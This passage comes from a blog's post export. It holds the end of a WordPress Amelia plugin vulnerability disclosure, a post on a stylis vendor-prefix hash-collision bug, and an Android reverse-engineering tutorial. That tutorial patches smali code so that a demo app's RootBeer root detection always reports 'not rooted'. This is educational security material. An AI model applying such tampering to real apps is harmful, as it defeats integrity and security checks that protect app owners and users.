$settingsService->getSetting('notifications', 'smsAlphaSenderId'), 'body' => $body ]; return $this->sendRequest($route, true, $data); &#125; Screenshot: Send test notification: Sending test notifications still costs real money, so we can drain out the account by keep calling this API. RemediationIn 1.0.48, they added permission check in the controller: if (!$this->getContainer()->getPermissionsService()->currentUserCanWrite(Entities::NOTIFICATIONS)) &#123; throw new AccessDeniedException('You are not allowed to send test email'); &#125; ConclusionWhen the software becomes more and more complex, developers usually overlook some basic permission checks and have false assumptions sometimes. For example, although front-end customers can’t see appointments-related API because it’s for providers, we can still find those API endpoints by looking at the source code in WordPress SVN. Developers should be cautions with those authorizations when implementing those features, to make sure the current user has permission to do certain operations. Disclosure timeline2022-02-20 Report updating appointment vulnerability via WPScan, reserved CVE-2022-07202022-03-01 1.0.47 is published, fixed CVE-2022-0720. WPScan2022-03-02 Report updating appointment vulnerability via WPScan, reserved CVE-2022-08252022-03-03 Report SMS related vulnerability via WPScan, reserved CVE-2022-08372022-03-09 1.0.48 is published, fixed CVE-2022-0837. WPScan2022-03-14 1.0.49 is published, fixed CVE-2022-0825. WPScan2022-03-26 Details and POC have been disclosed on WPScan2022-03-30 Blog post published","link":"/2022/03/30/en/amelia-wordpress-plugin-sensitive-data-exposure-detail/"},{"title":"An interesting styled components bug","text":"IntroductionWhile making some performance adjustments at work, I accidentally discovered a strange phenomenon. After investigating further, I found a bug that seemed to have gone unnoticed by anyone, and I found the cause quite interesting. So I thought I’d write a post to share it with everyone. This post is not very technical, so you can read it with a story-telling mindset, which will make it more interesting. The Beginning of the StoryThe origin of the story is that I was making some adjustments to a website at work, trying to improve its loading speed. When it comes to performance optimization, there are many things that can be done. For example, with regard to the server, the following are more relevant: Use HTTP&#x2F;2 Use gzip or brotli for compression Use Cache (to speed up revisits) Use CDN Reduce TTFB time However, all of the above require assistance from the backend or SRE, and are not very relevant to the frontend. With regard to the frontend, there are many aspects to consider. For example, from the perspective of “reducing resources,” the following can be done: Image format adjustment (compression + webp or other formats) JS size (ugligy, code splitting, dynamic import) CSS size (minify, remove unnecessary CSS) From the perspective of “accelerating the loading of important resources,” preload or preconnect hints can be added to indicate to the browser which things should be loaded first. You can also look at it from the perspective of “reducing JS execution time.” For example, if you are writing React, you can use shouldComponentUpdate, PureComponent, or memo to reduce unnecessary re-renders. Since the title of this post is “styled components,” the main topic is, of course, centered around CSS. In the CSS part, in order to reduce the first loading time, one trick is to inline critical CSS in the HTML, so that you don’t have to make another request to get the CSS back, which saves one round-trip. However, this will also affect the size of the HTML, but not by much. Anyway, we used this trick on our website and inline CSS in the HTML, which looks like this: A lot of dense CSS. And what caught my attention the most were those vendor prefixes: Due to various historical factors, some CSS properties need to be prefixed to work. For example, if you want to use flexbox on an older version of IE, you need to write: display: -ms-flexbox;. And I looked at the prefixes we have on our website, which are probably: display: -ms-flexbox display: -webkit-flex -ms-flex-wrap: wrap -webkit-flex-wrap: wrap -ms-transform: rotate(45deg) -webkit-transform: rotate(45deg) -ms-letter-spacing: 0.03em -webkit-letter-spacing: 0.03em ….more These prefixes are all added by styled components. Here’s a brief introduction to styled components. In short, you can use this syntax to add CSS to a component: import styled from 'styled-components'; const Box = styled.div` background: red; ` // use it like this &lt;Box /> The principle behind it is that styled components will convert the style you write into a className and put it on the component for you. Vendor prefixes are also part of what it handles. Everything seems fine, but there is room for improvement. In our project, we have already determined the level of browser support, and we don’t need to support IE. Since we don’t need to support IE, many prefixes starting with -ms are not necessary, and removing them will save space, so it’s better to remove them. But how do we remove them? Removing Extra PrefixesFor this need to add the correct prefix to CSS, there is a well-known tool called Autoprefixer: This tool is very simple. You just need to give it your entire CSS, and it will help you convert it into the correct form, which means: Add necessary prefixes Remove unnecessary prefixes How does it know what is necessary? This is the best part. It supports something called Browserslist. Simply put, you can write a file that specifies which browsers your project needs to support, like this: # Browsers that we support defaults not IE 11 not IE_Mob 11 &gt; 1% You can also use syntax like &gt; 1% to let it grab the usage rate of browsers that are used more than 1% and add them to the list. So with this list and Autoprefixer, you can generate streamlined CSS and remove unnecessary vendor prefixes. How do you use this tool with styled components? In styled components, there is something called StyleSheetManager, which added two parameters in v5: disableVendorPrefixes stylisPlugins The first parameter removes all vendor prefixes, so it won’t automatically add them: // example from official docs import styled, &#123; StyleSheetManager &#125; from 'styled-components' const Box = styled.div` color: $&#123;props => props.theme.color&#125;; display: flex; ` render( &lt;StyleSheetManager disableVendorPrefixes> &lt;Box>If you inspect me, there are no vendor prefixes for the flexbox style.&lt;/Box> &lt;/StyleSheetManager> ) The second parameter stylisPlugins is actually the key point. The official example is like this: import styled, &#123; StyleSheetManager &#125; from 'styled-components' import stylisRTLPlugin from 'stylis-plugin-rtl'; const Box = styled.div` background: mediumseagreen; border-left: 10px solid red; ` render( &lt;StyleSheetManager stylisPlugins=&#123;[stylisRTLPlugin]&#125;> &lt;Box>My border is now on the right!&lt;/Box> &lt;/StyleSheetManager> ) Simply put, styled components use a package called stylis in the underlying layer, and this package can pass custom plugins to do some conversion. It sounds like a very promising approach, but the official documentation doesn’t cover it much. So I went to study the code of styled components and found out how to write this plugin by looking at this section: /** * When writing a style like * * &amp; + &amp; &#123; * color: red; * &#125; * * The second ampersand should be a reference to the static component class. stylis * has no knowledge of static class so we have to intelligently replace the base selector. * * https://github.com/thysultan/stylis.js#plugins &lt;- more info about the context phase values * \"2\" means this plugin is taking effect at the very end after all other processing is complete */ const selfReferenceReplacementPlugin = (context, _, selectors) => &#123; if (context === 2 &amp;&amp; selectors.length &amp;&amp; selectors[0].lastIndexOf(_selector) > 0) &#123; // eslint-disable-next-line no-param-reassign selectors[0] = selectors[0].replace(_selectorRegexp, selfReferenceReplacer); &#125; However, the link attached inside doesn’t seem to have any information related to the plugin… So I turned to study the package that appeared in the example: stylis-plugin-rtl, and its source code is much more detailed: // @flow import cssjanus from \"cssjanus\"; // https://github.com/thysultan/stylis.js#plugins const STYLIS_CONTEXTS = &#123; POST_PROCESS: -2, PREPARATION: -1, NEWLINE: 0, PROPERTY: 1, SELECTOR_BLOCK: 2, AT_RULE: 3 &#125;; export type StylisContextType = $Values&lt;typeof STYLIS_CONTEXTS>; // We need to apply cssjanus as early as possible to capture the noflip directives if used // (they are not present at the PROPERTY, SELECTOR_BLOCK, or POST_PROCESS steps) export const STYLIS_PROPERTY_CONTEXT = STYLIS_CONTEXTS.PREPARATION; function stylisRTLPlugin(context: StylisContextType, content: string): ?string &#123; if (context === STYLIS_PROPERTY_CONTEXT) &#123; return cssjanus.transform(content); &#125; &#125; // stable identifier that will not be dropped by minification unless the whole module // is unused /*#__PURE__*/ Object.defineProperty(stylisRTLPlugin, \"name\", &#123; value: \"stylisRTLPlugin\" &#125;); export default stylisRTLPlugin; I have seen similar plugin writing methods before, so I can quickly get into the situation. Stylis will provide you with several different contexts and contents. You can decide what to do based on the context and pass back the processed style. Therefore, our plugin can be written like this: import autoprefixer from 'autoprefixer'; import postcss from 'postcss'; const POST_PROCESS_CONTEXT = -2; function plugin (context, content) &#123; if (context !== POST_PROCESS_CONTEXT) &#123; return content; &#125; return postcss([autoprefixer]).process(content).css; &#125; Call postcss in the post process stage, and use autoprefixer to convert the content. Finally, you can get clean CSS. ResultsHere’s how effective it is. Before using it, I counted the number of prefixes in the CSS (directly using global search): -webkit: ~300 -ms: ~200 -moz: ~60 -o: 1 A total of about 560. After using Autoprefixer, it becomes: -webkit: ~300 &#x3D;&gt; 26 -ms: ~200 &#x3D;&gt; 6 -moz: ~60 &#x3D;&gt; 13 -o: 1 &#x3D;&gt; 0 From 560 to about 45, reducing about 90% of unnecessary vendor prefixes! The size of the entire HTML + inline CSS was 43KB after gzip compression before. You can guess how much it became after making this change. ............. The answer is: 42KB! Yes, you read that right, it only reduced by 1KB. When I saw this result, I learned two things: gzip is powerful Optimization needs to be measured. Sometimes you think you have improved a lot, but you haven’t I guess the reason why it only reduced by 1KB is that after gzip, there is actually not much difference. Although the number of prefixes has been greatly reduced, it won’t really save that much space. The information remembered by gzip may have changed from “300 webkits” to “26 webkits”, but it’s just a reduction in the number, so there is no improvement in file size. Although the file size has not been reduced much, there are still some improvements. The task has been successfully completed. What about the bug?Okay, you might be thinking at this point: “I learned a trick… wait, isn’t this article about bugs? Where’s the bug? Why didn’t I see anything that looks like a bug?” In fact, the bug is hidden in a list I compiled earlier: display: -ms-flexbox display: -webkit-flex -ms-flex-wrap: wrap -webkit-flex-wrap: wrap -ms-transform: rotate(45deg) -webkit-transform: rotate(45deg) -ms-letter-spacing: 0.03em -webkit-letter-spacing: 0.03em ….more If you look closely, you will notice a strange property called letter-spacing. When I first saw it, I thought I was not skilled enough. After all, I’ve been writing CSS for so many years, and I didn’t know that letter-spacing needed a prefix to work. So I went to caniuse to check it out and found that, as I remembered, it didn’t need one. So why is it here? Out of curiosity, I looked at the source code of stylis. By the way, I mentioned earlier that there was no introduction to the plugin in the styled components source code link, which was due to version issues. Stylis was updated to v4 in April 2020, while styled components used v3.5.4. To be more precise, styled components actually depends on @emotion/stylis v0.8.4 (yes, another library called emotion), and this emotion’s stylis depends on the real stylis 3.5.4 version. So this letter-spacing issue is not just with styled components, but also with emotion. Here’s a demo on codesandbox: https://codesandbox.io/s/stylis-bug-6yu6g?file=/src/App.js When you open it and right-click on the element above, you can see: Now that I know it was a version issue, I can find the correct version of the source code to look at, which is a very large file: https://github.com/thysultan/stylis.js/blob/v3.5.4/stylis.js I extracted the most essential part, the vendor-prefixed part (with some code omitted): function property (input, first, second, third) &#123; var index = 0 var out = input + ';' var hash = (first*2) + (second*3) + (third*4) var cache // animation: a, n, i characters if (hash === 944) &#123; return animation(out) &#125; else if (prefix === 0 || (prefix === 2 &amp;&amp; !vendor(out, 1))) &#123; return out &#125; // vendor prefix switch (hash) &#123; // text-decoration/text-size-adjust/text-shadow/text-align/text-transform: t, e, x case 1015: &#123; // text-shadow/text-align/text-transform, a return out.charCodeAt(10) === 97 ? webkit + out + out : out &#125; // filter/fill f, i, l case 951: &#123; // filter, t return out.charCodeAt(3) === 116 ? webkit + out + out : out &#125; // color/column, c, o, l case 963: &#123; // column, n return out.charCodeAt(5) === 110 ? webkit + out + out : out &#125; // box-decoration-break, b, o, x case 1009: &#123; if (out.charCodeAt(4) !== 100) &#123; break &#125; &#125; // mask, m, a, s // clip-path, c, l, i case 969: case 942: &#123; return webkit + out + out &#125; // appearance: a, p, p case 978: &#123; return webkit + out + moz + out + out &#125; &#125; &#125; It looks like it adds a comment for each prefix, so I searched for letter-spacing and found nothing. This made things interesting, as it seems that the behavior of adding a vendor prefix to letter-spacing was not intentional. Next, let’s take a look at how it adds prefixes. It first hashes the property through a custom hash: var hash = (first*2) + (second*3) + (third*4), then checks the result of the hash and adds the prefix based on the result. Let’s hash letter-spacing: function hash(str) &#123; return str.charCodeAt(0) * 2 + str.charCodeAt(1) * 3 + str.charCodeAt(2) * 4 &#125; console.log(hash('letter-spacing')) // 983 Then search for 983 in the source code: The mystery is solved! It turns out to be a bug caused by hash collision! I’ve heard many suggestions that hash functions should not be defined by oneself, but I never thought I would see a real-world case of a collision caused by a custom hash function. The string user-select also hashes to 983, just like letter-spacing. Therefore, when converting letter-spacing, it will run into this case and add a vendor prefix to letter-spacing. So let’s correct the title here. It’s not a bug in styled components, but a bug in stylis. However, both styled components and emotion use stylis, so they both have this bug. Follow-upI searched through the repos of styled, emotion, and styled components, and it seems that no one has noticed this issue. However, I did find a PR for emotion that updates stylis to v4: Stylis v4 #1817, which has already been merged recently. So the next version of emotion (which should be a major version update because it’s a breaking change) will not have this issue. And I also posted an issue to stylis about this: Redundant css vendor prefix for letter-spacing in v3 #223. However, it seems that there is nothing they can do about it, and this is a bug in the old version that has been fixed in the new version, so it will not be fixed in the old version. Finally, I also posted an issue to styled components about this: Redundant css vendor prefix for letter-spacing #3157, but no one has responded yet. I also submitted a PR to update the document URL: Update stylis plugin docs url #3156, to avoid others having the same problem finding the plugin documentation. SummaryIn fact, I learned a lot from this incident. The first point is that I discovered an interesting bug caused by hash collision. The second point is that I originally thought that removing those 500+ prefixes would reduce the file size a bit, but after measuring it, it only reduced 1KB. Many times I forget to consider the factor of gzip. After this incident, I won’t forget it again. The third point is that I found that I seem to have a mentality of “must fix the bug”, but in the real world, it is not so ideal, after all, there is a priority for doing things. Although adding prefixes to letter-spacing is indeed a redundant thing, what is the impact? It just increases a little bit of insignificant file size and looks a bit strange. To be honest, it is not a serious bug. Even if it is not fixed, it does not have much impact, and the webpage will not be affected. Therefore, it is a harmless bug. So through this incident, I have reorganized my mentality when facing bugs. That’s about it for this article. If your website also uses emotion or styled components, why not check if you also have this letter-spacing issue!","link":"/2020/07/11/en/an-interesting-styled-components-bug/"},{"title":"Android App Reverse Engineering Part 2: Modifying Smali Code","text":"In the first part, we learned the basics of using Apktool to decompile an APK, modify its resources, reassemble it, and install the aligned and signed APK on a device. In this part, we will learn how to modify the code. Our goal is to bypass the root detection check on a rooted device and make the app display that it is not rooted. If you are testing on a non-rooted device, you can do the opposite and modify the app to detect that you have root access. Series links: Android App Reverse Engineering Part 1: Decompiling and Recompiling APKs Android App Reverse Engineering Part 2: Modifying Smali Code Android App Reverse Engineering Part 3: Intercepting App Traffic Android App Reverse Engineering Part 4: Dynamic Analysis with Frida What is SmaliIn the content we decompiled using apktool d, there is a folder called smali, which contains the code that was decompiled from classes.dex. However, this code may not look like what you expect. For example, let’s take a look at smali/com/cymetrics/demo/MainActivity.smali: .class public Lcom/cymetrics/demo/MainActivity; .super Landroidx/appcompat/app/AppCompatActivity; .source \"MainActivity.java\" # direct methods .method public constructor &lt;init>()V .locals 0 .line 16 invoke-direct &#123;p0&#125;, Landroidx/appcompat/app/AppCompatActivity;->&lt;init>()V return-void .end method # virtual methods .method protected onCreate(Landroid/os/Bundle;)V .locals 1 .line 20 invoke-super &#123;p0, p1&#125;, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V const p1, 0x7f0b001c .line 21 invoke-virtual &#123;p0, p1&#125;, Lcom/cymetrics/demo/MainActivity;->setContentView(I)V const p1, 0x7f080122 .line 22 invoke-virtual &#123;p0, p1&#125;, Lcom/cymetrics/demo/MainActivity;->findViewById(I)Landroid/view/View; move-result-object p1 check-cast p1, Landroidx/appcompat/widget/Toolbar; .line 23 invoke-virtual &#123;p0, p1&#125;, Lcom/cymetrics/demo/MainActivity;->setSupportActionBar(Landroidx/appcompat/widget/Toolbar;)V const p1, 0x7f08007a .line 25 invoke-virtual &#123;p0, p1&#125;, Lcom/cymetrics/demo/MainActivity;->findViewById(I)Landroid/view/View; move-result-object p1 check-cast p1, Lcom/google/android/material/floatingactionbutton/FloatingActionButton; .line 26 new-instance v0, Lcom/cymetrics/demo/MainActivity$1; invoke-direct &#123;v0, p0&#125;, Lcom/cymetrics/demo/MainActivity$1;->&lt;init>(Lcom/cymetrics/demo/MainActivity;)V invoke-virtual &#123;p1, v0&#125;, Lcom/google/android/material/floatingactionbutton/FloatingActionButton;->setOnClickListener(Landroid/view/View$OnClickListener;)V return-void .end method .method public onCreateOptionsMenu(Landroid/view/Menu;)Z .locals 2 .line 38 invoke-virtual &#123;p0&#125;, Lcom/cymetrics/demo/MainActivity;->getMenuInflater()Landroid/view/MenuInflater; move-result-object v0 const/high16 v1, 0x7f0c0000 invoke-virtual &#123;v0, v1, p1&#125;, Landroid/view/MenuInflater;->inflate(ILandroid/view/Menu;)V const/4 p1, 0x1 return p1 .end method .method public onOptionsItemSelected(Landroid/view/MenuItem;)Z .locals 2 .line 47 invoke-interface &#123;p1&#125;, Landroid/view/MenuItem;->getItemId()I move-result v0 const v1, 0x7f08003f if-ne v0, v1, :cond_0 const/4 p1, 0x1 return p1 .line 54 :cond_0 invoke-super &#123;p0, p1&#125;, Landroidx/appcompat/app/AppCompatActivity;->onOptionsItemSelected(Landroid/view/MenuItem;)Z move-result p1 return p1 .end method If you find it hard to read, that’s normal. Smali is the byte code that runs on the Android Dalvik VM and has its own syntax rules. To see the Java code we are familiar with, we need to decompile the Smali code back into Java. Decompiling Smali Code into Java Code with jadxNext, we will use another tool: jadx, which describes itself on GitHub as a “Dex to Java decompiler.” I will skip the installation process, and we will use jadx to decompile the APK: # -r means don't decompile resources # -d is for destination jadx -r demoapp.apk -d jadx-demoapp After running the command, we will see a new folder called jadx-demoapp. We can navigate to sources/com/cymetrics/demo/MainActivity.java and see the following content: package com.cymetrics.demo; import android.os.Bundle; import android.view.Menu; import android.view.MenuItem; import android.view.View; import androidx.appcompat.app.AppCompatActivity; import androidx.appcompat.widget.Toolbar; import com.google.android.material.floatingactionbutton.FloatingActionButton; import com.google.android.material.snackbar.Snackbar; /* loaded from: classes.dex */ public class MainActivity extends AppCompatActivity &#123; /* JADX INFO: Access modifiers changed from: protected */ @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity public void onCreate(Bundle bundle) &#123; super.onCreate(bundle); setContentView(R.layout.activity_main); setSupportActionBar((Toolbar) findViewById(R.id.toolbar)); ((FloatingActionButton) findViewById(R.id.fab)).setOnClickListener(new View.OnClickListener() &#123; // from class: com.cymetrics.demo.MainActivity.1 @Override // android.view.View.OnClickListener public void onClick(View view) &#123; Snackbar.make(view, \"Replace with your own action\", 0).setAction(\"Action\", (View.OnClickListener) null).show(); &#125; &#125;); &#125; @Override // android.app.Activity public boolean onCreateOptionsMenu(Menu menu) &#123; getMenuInflater().inflate(R.menu.menu_main, menu); return true; &#125; @Override // android.app.Activity public boolean onOptionsItemSelected(MenuItem menuItem) &#123; if (menuItem.getItemId() == R.id.action_settings) &#123; return true; &#125; return super.onOptionsItemSelected(menuItem); &#125; &#125; This is the content we want to see! Since this APK has not been obfuscated, we can see almost the entire Java file, which is not much different from the original source code. To briefly explain obfuscation, it is the process of scrambling the code to make it difficult for people to see what the original code was. For example, changing variable names to meaningless names like aa, bb, cc, dd is the most basic form of obfuscation. In Android development, ProGuard is usually used to obfuscate code. The code above is obviously not obfuscated, making it easy for us to see the original logic. The code we want to modify is in com/cymetrics/demo/FirstFragment.java: package com.cymetrics.demo; import android.os.Bundle; import android.view.LayoutInflater; import android.view.View; import android.view.ViewGroup; import android.widget.TextView; import androidx.fragment.app.Fragment; import com.scottyab.rootbeer.RootBeer; /* loaded from: classes.dex */ public class FirstFragment extends Fragment &#123; @Override // androidx.fragment.app.Fragment public View onCreateView(LayoutInflater layoutInflater, ViewGroup viewGroup, Bundle bundle) &#123; return layoutInflater.inflate(R.layout.fragment_first, viewGroup, false); &#125; @Override // androidx.fragment.app.Fragment public void onViewCreated(View view, Bundle bundle) &#123; super.onViewCreated(view, bundle); view.findViewById(R.id.button_first).setOnClickListener(new View.OnClickListener() &#123; // from class: com.cymetrics.demo.FirstFragment.1 @Override // android.view.View.OnClickListener public void onClick(View view2) &#123; TextView textView = (TextView) view2.getRootView().findViewById(R.id.textview_first); if (new RootBeer(view2.getContext()).isRooted()) &#123; textView.setText(\"Rooted!\"); &#125; else &#123; textView.setText(\"Safe, not rooted\"); &#125; &#125; &#125;); &#125; &#125; The main logic is in this section: public void onClick(View view2) &#123; TextView textView = (TextView) view2.getRootView().findViewById(R.id.textview_first); if (new RootBeer(view2.getContext()).isRooted()) &#123; textView.setText(\"Rooted!\"); &#125; else &#123; textView.setText(\"Safe, not rooted\"); &#125; &#125; This section calls a third-party library to check for root access. If root access is detected, it displays “Rooted!” Otherwise, it displays “Safe, not rooted.” When studying the code logic, we can look at the Java code. However, if we want to modify the code, it is not as simple as modifying the Java code. We must modify the Smali code directly to repackage the app. Modifying Smali CodeDo you remember the folder we extracted using Apktool? The Smali code is in there, and the path is smali/com/cymetrics/demo/FirstFragment$1.smali. If we carefully examine the content, we can find the onClick code: # virtual methods .method public onClick(Landroid/view/View;)V .locals 2 .line 32 invoke-virtual &#123;p1&#125;, Landroid/view/View;->getRootView()Landroid/view/View; move-result-object v0 const v1, 0x7f08011c invoke-virtual &#123;v0, v1&#125;, Landroid/view/View;->findViewById(I)Landroid/view/View; move-result-object v0 check-cast v0, Landroid/widget/TextView; .line 34 new-instance v1, Lcom/scottyab/rootbeer/RootBeer; invoke-virtual &#123;p1&#125;, Landroid/view/View;->getContext()Landroid/content/Context; move-result-object p1 invoke-direct &#123;v1, p1&#125;, Lcom/scottyab/rootbeer/RootBeer;->&lt;init>(Landroid/content/Context;)V .line 35 invoke-virtual &#123;v1&#125;, Lcom/scottyab/rootbeer/RootBeer;->isRooted()Z move-result p1 if-eqz p1, :cond_0 const-string p1, \"Rooted!\" .line 36 invoke-virtual &#123;v0, p1&#125;, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V goto :goto_0 :cond_0 const-string p1, \"Safe, not rooted\" .line 38 invoke-virtual &#123;v0, p1&#125;, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V :goto_0 return-void .end method This is a brief explanation of some basic smali syntax. .method public onClick(Landroid/view/View;)V means that there is a public method called onClick, which takes a parameter of type android/view/View, and the V at the end of the parentheses means void, indicating that there is no return value. .locals 2 means that this function will use two registers, v0 and v1. If you use v2, it will cause an error. Therefore, if you need more registers, remember to change this part. The parameter is represented by p. Usually, p0 represents this, and p1 is the first parameter. Therefore, invoke-virtual &#123;p1&#125;, Landroid/view/View;-&gt;getRootView()Landroid/view/View; calls the getRootView() method with the first parameter. The core code in this section is: .line 35 invoke-virtual &#123;v1&#125;, Lcom/scottyab/rootbeer/RootBeer;->isRooted()Z move-result p1 if-eqz p1, :cond_0 const-string p1, \"Rooted!\" .line 36 invoke-virtual &#123;v0, p1&#125;, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V goto :goto_0 :cond_0 const-string p1, \"Safe, not rooted\" if-eqz p1, :cond_0 means that if p1 is 0, it will jump to :cond_0, and p1 is the return value of RootBeer-&gt;isRooted(). That is to say, p1 represents the result of the root check, and as long as p1 is changed, different results can be forged. There are many ways to change it. For example, changing the original if-eqz to if-nez can reverse the logic, or we can directly change p1 to 0 and add a log to confirm that we have executed here: .line 35 invoke-virtual &#123;v1&#125;, Lcom/scottyab/rootbeer/RootBeer;->isRooted()Z move-result p1 # add log, print \"we are here\" const-string v1, \"we are here\" invoke-static &#123;v1, v1&#125;, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I # set p1 to 0 const/4 p1, 0x0 if-eqz p1, :cond_0 const-string p1, \"Rooted!\" .line 36 invoke-virtual &#123;v0, p1&#125;, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V goto :goto_0 :cond_0 const-string p1, \"Safe, not rooted\" After adding those three lines, save it, then repack it as mentioned in the previous article, install it on the phone, and check the log. To view Android’s log, you need to use the adb logcat command. However, if you enter this command directly, a lot of logs will be displayed. Here are two useful commands. The first is adb logcat -c, which clears the previous log. The second is: adb logcat --pid=`adb shell pidof -s com.cymetrics.demo` This can display logs of the specified package name and exclude other noise, which is really useful. After preparation, click the CHECK ROOT button in the app, and you will see a new log: 01-25 09:32:06.528 27651 27651 E we are here: we are here And the words Safe, not rooted on the screen, which means we have succeeded. Modifying code in other placesWe just modified the code in the fragment, which is the logic of the program, and replaced the return value of isRooted() to always be false, bypassing the check. But if there are other places in the program that will do similar checks, it will be troublesome because we must find every place that does the check and do similar things to change each one. Therefore, a more efficient method is to directly modify the code of this third-party library to make isRooted always return false. This way, even if the app checks in multiple places, they will all be bypassed. The code when calling the function is Lcom/scottyab/rootbeer/RootBeer;-&gt;isRooted(), so we can find this file by searching for com/scottyab/rootbeer/RootBeer.smali and searching for isRooted to find the code: .method public isRooted()Z .locals 1 .line 44 invoke-virtual &#123;p0&#125;, Lcom/scottyab/rootbeer/RootBeer;->detectRootManagementApps()Z move-result v0 if-nez v0, :cond_1 invoke-virtual &#123;p0&#125;, Lcom/scottyab/rootbeer/RootBeer;->detectPotentiallyDangerousApps()Z move-result v0 if-nez v0, :cond_1 const-string v0, \"su\" invoke-virtual &#123;p0, v0&#125;, Lcom/scottyab/rootbeer/RootBeer;->checkForBinary(Ljava/lang/String;)Z move-result v0 if-nez v0, :cond_1 .line 45 invoke-virtual &#123;p0&#125;, Lcom/scottyab/rootbeer/RootBeer;->checkForDangerousProps()Z move-result v0 if-nez v0, :cond_1 invoke-virtual &#123;p0&#125;, Lcom/scottyab/rootbeer/RootBeer;->checkForRWPaths()Z move-result v0 if-nez v0, :cond_1 .line 46 invoke-virtual &#123;p0&#125;, Lcom/scottyab/rootbeer/RootBeer;->detectTestKeys()Z move-result v0 if-nez v0, :cond_1 invoke-virtual &#123;p0&#125;, Lcom/scottyab/rootbeer/RootBeer;->checkSuExists()Z move-result v0 if-nez v0, :cond_1 invoke-virtual &#123;p0&#125;, Lcom/scottyab/rootbeer/RootBeer;->checkForRootNative()Z move-result v0 if-nez v0, :cond_1 invoke-virtual &#123;p0&#125;, Lcom/scottyab/rootbeer/RootBeer;->checkForMagiskBinary()Z move-result v0 if-eqz v0, :cond_0 goto :goto_0 :cond_0 const/4 v0, 0x0 goto :goto_1 :cond_1 :goto_0 const/4 v0, 0x1 :goto_1 return v0 .end method Patching this function is very simple. We just make it always return false: .method public isRooted()Z .locals 1 # always returns false const/4 v0, 0x0 return v0 # 以下省略... .end method After that, repack it and install it on the phone as before, and you will see the bypassed result. SummaryIn this article, we learned how to read basic smali code and modify it, and how to use adb logcat to view Android app logs. We also modified smali practically, reversed the original logic, and bypassed the root check of the app. Adding logs is a method that I think seems stupid and inefficient, but it is very useful. It is like adding a lot of console.log when writing code with errors to confirm that the execution flow of the program matches our expectations, which is helpful for restoring logic. Finally, I only briefly mentioned smali in this article. If you want to learn more about smali syntax, you can refer to the following articles: Android Reverse Basics: Smali Syntax APK Decompilation 1: Basic Knowledge-Smali File Reading In the next article, I will introduce how to monitor the requests and responses sent by the app to help us understand the communication between the app and the API server. Series links: Android App Reverse Engineering Part 1: Decompiling and Rebuilding APKs Android App Reverse Engineering Part 2: Modifying Smali Code - You are here Android App Reverse Engineering Part 3: Monitoring App Packets Android App Reverse Engineering Part 4: Dynamic Analysis with Frida","link":"/2023/04/27/en/android-apk-decompile-intro-2/"},{"title":"Android App Reverse Engineering Part 1: Decompiling and Rebuilding APKs","text":"Five years ago, I wrote an article titled [Android] Everyone Can Reverse Engineer APKs. At that time, I was an Android engineer who, due to work requirements, researched basic Android reverse engineering with my colleagues. Our goal was to achieve a fully automated process: upload an APK, automatically decompile it, insert some strange things, and then repackage it. Now, due to work requirements, I have revisited and reinforced my knowledge of APK reverse engineering and modification, and have written this series of articles to share with you. First of all, I want to emphasize that this series is only an “introduction.” By using various tools to decompile and rebuild APKs, it should be sufficient for apps that are not obfuscated. However, if the app has been obfuscated, deeper knowledge of binary is required to unlock it, which is another world. In any case, this series is suitable for those who have not been exposed to Android app reverse engineering and want to try it out, as well as for Android engineers who want to decompile their own apps and see what they look like. I think it’s quite useful. Series links: Introduction to Android App Reverse Engineering Part 1: Decompiling and Rebuilding APKs Introduction to Android App Reverse Engineering Part 2: Modifying Smali Code Introduction to Android App Reverse Engineering Part 3: Monitoring App Packets Introduction to Android App Reverse Engineering Part 4: Dynamic Analysis with Frida Start by Understanding Android App DevelopmentI think that if you want to reverse engineer an Android app, it is helpful to have a rough understanding of how the app is developed, so that you can quickly understand what each part is doing after decompiling the app. Therefore, I highly recommend that you find a tutorial for an Android app, install Android Studio, write a very simple app, and run it, even packaging it into an APK file. This will strengthen your understanding of the entire process. Next, I will briefly show you how an app is developed. First of all, an app is composed of three components: AndroidManifest.xml, which can be thought of as the app’s configuration file, containing various app-related information. Resources, including layout, strings that appear in the program, images, and all other information. Code Below is a screenshot of a simple project. On the left is the file structure, and on the right is the contents of AndroidManifest.xml: To ensure that the image is clear, the contents of the XML are shown below: &lt;?xml version=\"1.0\" encoding=\"utf-8\"?> &lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.example.myapplication\"> &lt;application android:allowBackup=\"true\" android:icon=\"@mipmap/ic_launcher\" android:label=\"@string/app_name\" android:roundIcon=\"@mipmap/ic_launcher_round\" android:supportsRtl=\"true\" android:theme=\"@style/AppTheme\"> &lt;activity android:name=\".MainActivity\" android:label=\"@string/app_name\" android:theme=\"@style/AppTheme.NoActionBar\"> &lt;intent-filter> &lt;action android:name=\"android.intent.action.MAIN\" /> &lt;category android:name=\"android.intent.category.LAUNCHER\" /> &lt;/intent-filter> &lt;/activity> &lt;/application> &lt;/manifest> From this file, we can learn several things, including: The package name of this app is com.example.myapplication. This app has an activity named MainActivity, which is the main activity. Each app has a unique package name, which can be thought of as the app’s ID and is written in the AndroidManifest. This is also related to the file structure of your code, as anyone who has written Java knows. If you go to the web version of Google Play, you will find that the URL contains the package name. For example, the URL of Facebook’s page looks like this: https://play.google.com/store/apps/details?id=com.facebook.katana&amp;hl=zh_TW&amp;gl=US Therefore, com.facebook.katana is the package name of the Facebook app. Next, let’s look at the second point. What is an activity? You can think of an activity as a “screen.” Each screen is an activity. Therefore, if it is an app that requires registration to use, there may be the following screens: Welcome page Registration page Login page Main page (displayed after successful login) Each of these pages is an activity, and each activity may have a layout. In Android development, a layout is actually an XML file, which looks like this: The right side is what you see, and the left side is the XML file of the layout. This is similar to the relationship between the screen and HTML+CSS in web front-end development, except that in Android development, the layout is generated using XML instead of HTML+CSS. Layouts are a type of resource and are placed in the res folder. There are two things worth noting about the layout file above. The first is android:id=&quot;@+id/textview_first&quot;, which represents the component corresponding to an ID. Why do we need to correspond to an ID? Because this way we can access this component in the code, like this: TextView tv = (TextView) findViewById(R.id.textview_first); tv.setText(\"hello\"); We need to find this component using the ID before we can change its text. The second thing worth noting is android:text=&quot;@string/hello_first_fragment&quot;, which is actually the text that the component will display. If I write: 